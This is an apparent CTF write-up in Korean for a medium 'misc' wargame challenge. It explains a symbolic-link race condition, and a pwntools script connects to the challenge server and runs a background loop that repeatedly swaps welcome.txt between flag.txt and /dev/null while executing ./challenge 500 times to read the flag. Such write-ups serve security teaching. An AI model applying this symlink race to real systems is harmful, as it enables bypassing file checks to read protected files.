@@ -1,0 +1,41 @@
+---
+ctf_name: Dreamkack-wargame
+challenge_name: 
+category: misc
+difficulty: medium
+author: ljw
+date: 2026-04-14
+points: 500
+tags: [race-condition, symbolic-link, pwn]
+---
+
+# Addrs-hold-the-key (The Asymptote)
+
+## 1. 문제 개요
+서버에서 실행되는 바이너리가 특정 파일을 검증하는 과정에서 발생하는 취약점을 이용하는 문제입니다. `welcome.txt` 파일에 대한 심볼릭 링크를 조작하여 권한을 우회하고 플래그를 획득해야 합니다.
+
+## 2. 분석 및 풀이 과정
+해당 문제는 심볼릭 링크의 대상을 빠르게 교체하는 **Race Condition(레이스 컨디션)** 공격을 필요로 합니다. 
+
+- `ln -sf` 명령어를 무한 루프로 실행하여 `welcome.txt`가 `flag.txt`를 가리켰다가, 다시 `/dev/null`을 가리키도록 반복합니다.
+- 이 루프가 돌아가는 동안 `./challenge` 바이너리를 여러 번 실행하면, 검증 로직을 통과하는 동시에 플래그 파일을 읽는 타이밍을 잡을 수 있습니다.
+
+## 3. 익스플로잇 코드 (`ex1.py`)
+제공된 파이썬 코드를 활용하여 자동화를 수행했습니다.
+
+```python
+from pwn import *
+
+r = remote('34.131.216.230', 1338)
+r.recvuntil(b'$')
+
+# 심볼릭 링크 교체 무한 루프 실행
+r.sendline(b'while true :; do ln -sf flag.txt welcome.txt; ln -sf /dev/null welcome.txt; done &')
+r.recvuntil(b'$')
+
+# 타이밍 공략을 위한 반복 실행
+for i in range(500):
+    r.sendline(b'./challenge')
+
+output = r.recvall(timeout=5).decode()
+print(output)
